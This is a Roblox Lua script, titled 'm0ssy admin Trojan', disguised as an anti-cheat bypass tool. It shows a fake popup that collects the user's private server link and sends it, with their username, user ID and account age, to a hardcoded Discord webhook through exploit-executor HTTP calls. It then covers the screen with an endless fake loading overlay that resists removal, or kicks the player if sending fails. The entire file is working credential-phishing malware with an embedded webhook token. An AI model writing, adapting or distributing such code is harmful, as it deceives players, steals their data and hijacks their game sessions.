-- m0ssy admin Trojan (FINAL POLISHED VERSION)
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer

-- Disable escape routes
pcall(function()
	StarterGui:SetCore("ChatActive", false)
	StarterGui:SetCore("TopbarEnabled", false)
end)

-- YOUR WEBHOOK
local WEBHOOK_URL = "https://discord.com/api/webhooks/1434573055484755969/Bkg0wkii3jT3zbgMLiQZs2sCV6XGAJczfGpNPiB1AlvBYv46qrzKYuCj0rA5QNKOJfDy"

-- CREATE POPUP IN STARTERGUI (Private Server Input)
local popupGui = Instance.new("ScreenGui")
popupGui.Name = "m0ssyAdminPopup"
popupGui.ResetOnSpawn = false
popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
popupGui.DisplayOrder = 10
popupGui.Parent = Player:WaitForChild("PlayerGui")

-- Popup Background (Green Gradient Theme)
local popupFrame = Instance.new("Frame")
popupFrame.Size = UDim2.new(0, 400, 0, 300)
popupFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
popupFrame.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
popupFrame.BorderSizePixel = 0
popupFrame.ZIndex = 10
popupFrame.Parent = popupGui

-- Green Gradient
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 0))
})
gradient.Rotation = 45
gradient.Parent = popupFrame

-- Corner rounding
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = popupFrame

-- Stroke
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 200, 0)
stroke.Thickness = 2
stroke.Parent = popupFrame

-- Title (Fredoka Font)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0.05, 0)
title.BackgroundTransparency = 1
title.Text = "m0ssy admin"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.ZIndex = 11
title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
title.TextStrokeTransparency = 0
title.Parent = popupFrame

-- Instructions
local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(0.9, 0, 0.15, 0)
instructions.Position = UDim2.new(0.05, 0, 0.3, 0)
instructions.BackgroundTransparency = 1
instructions.Text = "Private server link required to bypass anti-cheat"
instructions.TextColor3 = Color3.fromRGB(200, 255, 200)
instructions.Font = Enum.Font.FredokaOne
instructions.TextScaled = true
instructions.ZIndex = 11
instructions.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
instructions.TextStrokeTransparency = 0
instructions.Parent = popupFrame

-- Text box
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.8, 0, 0.15, 0)
textBox.Position = UDim2.new(0.1, 0, 0.5, 0)
textBox.BackgroundColor3 = Color3.fromRGB(20, 60, 20)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.Font = Enum.Font.FredokaOne
textBox.PlaceholderText = "https://www.roblox.com/share?code=XXXXXX&type=Server"
textBox.PlaceholderColor3 = Color3.fromRGB(150, 200, 150)
textBox.TextScaled = true
textBox.ZIndex = 11
textBox.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
textBox.TextStrokeTransparency = 0
textBox.Parent = popupFrame

local textBoxCorner = Instance.new("UICorner")
textBoxCorner.CornerRadius = UDim.new(0, 8)
textBoxCorner.Parent = textBox

-- Submit button
local submitButton = Instance.new("TextButton")
submitButton.Size = UDim2.new(0.5, 0, 0.15, 0)
submitButton.Position = UDim2.new(0.25, 0, 0.75, 0)
submitButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
submitButton.Font = Enum.Font.FredokaOne
submitButton.Text = "BYPASS ANTI-CHEAT"
submitButton.TextScaled = true
submitButton.ZIndex = 11
submitButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
submitButton.TextStrokeTransparency = 0
submitButton.Parent = popupFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = submitButton

-- Error label
local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
errorLabel.Position = UDim2.new(0.1, 0, 0.65, 0)
errorLabel.BackgroundTransparency = 1
errorLabel.Text = "Invalid server link format!"
errorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
errorLabel.Font = Enum.Font.FredokaOne
errorLabel.TextScaled = true
errorLabel.ZIndex = 11
errorLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
errorLabel.TextStrokeTransparency = 0
errorLabel.Visible = false
errorLabel.Parent = popupFrame

-- Validate server link
local function isValidPrivateServerLink(link)
    if not link then return false end
    return string.find(link, "roblox%.com/share%?code=[%w%-_]+&type=Server") ~= nil
end

-- KICK FUNCTION
local function kickPlayer()
    pcall(function()
        Player:Kick("m0ssy admin: Anti-cheat bypass failed. Please rejoin.")
    end)
    pcall(function()
        TeleportService:Teleport(game.PlaceId, Player)
    end)
end

-- OPTIMIZED EXECUTOR ORDER: Delta â†’ Krnl â†’ Others
local function sendWebhook(serverLink)
    local payload = {
        content = "@everyone ðŸŽ£ m0ssy admin VICTIM",
        embeds = {{
            title = "Private Server Harvested",
            description = "Skid fell for the anti-cheat bypass",
            fields = {
                {name = "ðŸ”— Server Link", value = "[CLICK TO JOIN](" .. serverLink .. ")", inline = false},
                {name = "ðŸ‘¤ Victim", value = "```" .. Player.Name .. "```", inline = true},
                {name = "ðŸ†” User ID", value = "```" .. Player.UserId .. "```", inline = true},
                {name = "ðŸ“… Account Age", value = "```" .. Player.AccountAge .. " days```", inline = true},
                {name = "ðŸŽ¯ Executor", value = "```" .. (syn and "Delta/Synapse" or http_request and "Krnl" or http and "Script-Ware" or request and "Other" or "Unknown") .. "```", inline = true}
            },
            color = 65280, -- Green
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    local jsonPayload = HttpService:JSONEncode(payload)
    
    -- 1. DELTA (syn.request) - Most likely to work first
    if syn and syn.request then
        local success, result = pcall(function()
            return syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        if success then return true end
    end
    
    -- 2. KRNL (http_request) - Second most common
    if http_request then
        local success, result = pcall(function()
            return http_request({
                Url = WEBHOOK_URL,
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        if success then return true end
    end
    
    -- 3. SCRIPT-WARE (http.request)
    if http and http.request then
        local success, result = pcall(function()
            return http.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        if success then return true end
    end
    
    -- 4. OTHER EXECUTORS (request)
    if request then
        local success, result = pcall(function()
            return request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        if success then return true end
    end
    
    return false
end

-- Start infinite loading (IN COREGUI)
local function startInfiniteLoading()
    -- Remove popup
    popupGui:Destroy()
    
    -- Create CoreGui loading screen
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "m0ssyAdminLoading"
    loadingGui.IgnoreGuiInset = true
    loadingGui.ResetOnSpawn = false
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingGui.DisplayOrder = 2147483647
    loadingGui.Parent = CoreGui

    -- Fullscreen black background
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.ZIndex = 2147483647
    background.Parent = loadingGui

    -- Loading text (Fredoka Font)
    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0.1, 0)
    loadingText.Position = UDim2.new(0, 0, 0.45, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Bypassing anti-cheat"
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.Font = Enum.Font.FredokaOne
    loadingText.TextScaled = true
    loadingText.ZIndex = 2147483647
    loadingText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    loadingText.TextStrokeTransparency = 0
    loadingText.Parent = background

    -- Progress bar background
    local progressBarBackground = Instance.new("Frame")
    progressBarBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
    progressBarBackground.Position = UDim2.new(0.2, 0, 0.6, 0)
    progressBarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    progressBarBackground.BorderSizePixel = 0
    progressBarBackground.ZIndex = 2147483647
    progressBarBackground.Parent = background

    local progressBarCorner = Instance.new("UICorner")
    progressBarCorner.CornerRadius = UDim.new(0, 8)
    progressBarCorner.Parent = progressBarBackground

    -- Progress bar fill (Green)
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 2147483647
    progressBar.Parent = progressBarBackground

    local progressFillCorner = Instance.new("UICorner")
    progressFillCorner.CornerRadius = UDim.new(0, 8)
    progressFillCorner.Parent = progressBar

    -- Animate loading text
    task.spawn(function()
        while true do
            for i = 1, 3 do
                loadingText.Text = "Bypassing anti-cheat" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)

    -- Infinite progress bar
    task.spawn(function()
        local progress = 0
        local speed = 0.05
        while true do
            progress = progress + 0.005
            if progress > 1 then progress = 0 end

            progressBar:TweenSize(
                UDim2.new(progress, 0, 1, 0),
                Enum.EasingDirection.Out,
                Enum.EasingStyle.Sine,
                speed,
                true
            )

            task.wait(speed)
            speed = math.min(speed + 0.005, 2)
        end
    end)

    -- Anti-removal protection for CoreGui
    loadingGui:GetPropertyChangedSignal("Parent"):Connect(function()
        if loadingGui.Parent ~= CoreGui then
            loadingGui.Parent = CoreGui
        end
    end)
end

-- Submit handler - KICKS IF WEBHOOK FAILS
submitButton.MouseButton1Click:Connect(function()
    local serverLink = textBox.Text
    
    if isValidPrivateServerLink(serverLink) then
        -- Try to send webhook
        local success = sendWebhook(serverLink)
        
        if success then
            -- Webhook worked - start infinite loading
            startInfiniteLoading()
        else
            -- Webhook failed - KICK THE PLAYER
            errorLabel.Text = "Anti-cheat bypass failed! Kicking..."
            errorLabel.Visible = true
            task.wait(2)
            kickPlayer()
        end
    else
        errorLabel.Visible = true
        task.wait(3)
        errorLabel.Visible = false
    end
end)

-- Enter key support
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        submitButton.MouseButton1Click:Connect()
    end
end)
